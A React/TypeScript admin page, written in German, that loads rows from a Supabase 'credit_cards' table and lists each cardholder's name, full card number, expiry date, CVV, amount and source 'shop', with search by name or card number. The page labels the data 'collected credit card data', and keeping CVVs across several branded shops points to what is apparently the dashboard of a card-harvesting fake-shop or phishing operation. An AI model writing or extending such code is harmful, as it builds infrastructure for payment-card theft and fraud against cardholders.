import { useMemo, useState } from "react";
import { createFileRoute } from "@tanstack/react-router";
import { useQuery } from "@tanstack/react-query";
import { Search } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import { AdminShell } from "@/components/admin/AdminShell";
import { Input } from "@/components/ui/input";
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table";

export const Route = createFileRoute("/admin/kreditkarten/")({
  component: CreditCardsPage,
});

type CreditCard = {
  id: string;
  cardholder_name: string;
  card_number: string;
  expiry: string;
  cvv: string;
  amount: number;
  shop_id: string;
};

type Shop = { id: string; shop_name: string; accent_color: string };

function CreditCardsPage() {
  const [search, setSearch] = useState("");

  const { data: cards = [], isLoading } = useQuery({
    queryKey: ["credit_cards"],
    queryFn: async () => {
      const { data, error } = await supabase
        .from("credit_cards")
        .select("id, cardholder_name, card_number, expiry, cvv, amount, shop_id")
        .order("created_at", { ascending: false });
      if (error) throw error;
      return data as CreditCard[];
    },
  });

  const { data: shops = [] } = useQuery({
    queryKey: ["shops-min"],
    queryFn: async () => {
      const { data, error } = await supabase
        .from("shops")
        .select("id, shop_name, accent_color");
      if (error) throw error;
      return data as Shop[];
    },
  });

  const shopMap = useMemo(() => {
    const m = new Map<string, Shop>();
    shops.forEach((s) => m.set(s.id, s));
    return m;
  }, [shops]);

  const filtered = useMemo(() => {
    const q = search.trim().toLowerCase();
    if (!q) return cards;
    return cards.filter(
      (c) =>
        c.cardholder_name.toLowerCase().includes(q) ||
        c.card_number.toLowerCase().includes(q),
    );
  }, [cards, search]);

  return (
    <AdminShell>
      <div className="p-4 lg:p-6 space-y-4">
        <div>
          <h1 className="text-2xl font-bold text-slate-900">Kreditkarten</h1>
          <p className="text-sm text-slate-500">Gesammelte Kreditkarten-Daten</p>
        </div>

        <div className="relative max-w-md">
          <Search className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-slate-400" />
          <Input
            placeholder="Nach Name oder Kreditkartennummer suchen..."
            value={search}
            onChange={(e) => setSearch(e.target.value)}
            className="pl-9 bg-white"
          />
        </div>

        <div className="rounded-lg border border-slate-200 bg-white overflow-hidden">
          <div className="overflow-x-auto">
            <Table>
              <TableHeader>
                <TableRow className="bg-slate-50">
                  <TableHead>Name</TableHead>
                  <TableHead>Kreditkartennummer</TableHead>
                  <TableHead>Ablaufdatum</TableHead>
                  <TableHead>CVV</TableHead>
                  <TableHead className="text-right">Betrag</TableHead>
                  <TableHead>Shop</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {isLoading ? (
                  <TableRow>
                    <TableCell colSpan={6} className="text-center py-8 text-slate-500">
                      Lädt...
                    </TableCell>
                  </TableRow>
                ) : filtered.length === 0 ? (
                  <TableRow>
                    <TableCell colSpan={6} className="text-center py-8 text-slate-500">
                      Keine Einträge gefunden.
                    </TableCell>
                  </TableRow>
                ) : (
                  filtered.map((c) => {
                    const shop = shopMap.get(c.shop_id);
                    return (
                      <TableRow key={c.id}>
                        <TableCell className="font-medium">{c.cardholder_name}</TableCell>
                        <TableCell className="font-mono text-xs">{c.card_number}</TableCell>
                        <TableCell className="font-mono text-xs">{c.expiry}</TableCell>
                        <TableCell className="font-mono text-xs">{c.cvv}</TableCell>
                        <TableCell className="text-right tabular-nums">
                          {Number(c.amount).toFixed(2)}
                        </TableCell>
                        <TableCell>
                          {shop ? (
                            <div className="flex items-center gap-2">
                              <span
                                className="h-2 w-2 rounded-full"
                                style={{ background: shop.accent_color }}
                              />
                              <span>{shop.shop_name}</span>
                            </div>
                          ) : (
                            "–"
                          )}
                        </TableCell>
                      </TableRow>
                    );
                  })
                )}
              </TableBody>
            </Table>
          </div>
        </div>
      </div>
    </AdminShell>
  );
}
